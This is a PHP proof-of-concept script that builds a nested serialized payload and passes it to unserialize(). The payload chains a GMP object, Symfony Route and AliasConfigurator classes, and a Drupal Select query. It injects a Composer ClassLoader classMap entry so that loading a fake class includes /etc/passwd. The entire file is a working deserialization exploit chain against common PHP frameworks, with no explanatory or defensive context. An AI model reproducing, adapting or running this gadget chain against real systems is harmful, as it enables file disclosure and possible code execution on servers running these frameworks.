<?php

include __DIR__.'/vendor/autoload.php';

$s  = 'O:75:"Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\AliasConfigurator":2:{';
$s .= 's:98:"'.chr(0).'Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\AbstractServiceConfigurator'.chr(0).'defaultTags";';
$s .= 'a:1:{s:4:"test";a:1:{i:0;s:3:"abc";}}';
$s .= 's:13:"'.chr(0).'*'.chr(0).'definition";O:33:"Drupal\\Core\\Database\\Query\\Select":1:{';
$s .= 's:9:"alterTags";a:1:{s:4:"test";R:2;}}A';

$composer_props = 's:39:"'.chr(0).'Composer\\Autoload\\ClassLoader'.chr(0).'classMap";a:1:{s:11:"LoadMeClass";s:11:"/etc/passwd";}';

$inner = 's:1:"1";a:2:{'.$composer_props.'i:777;C:31:"Symfony\\Component\\Routing\\Route":'.strlen($s).':{'.$s.'}}';

$exploit = 'a:2:{i:1;C:3:"GMP":'.strlen($inner).':{'.$inner.'}i:2;O:11:"LoadMeClass":0:{}}';

unserialize($exploit);

?>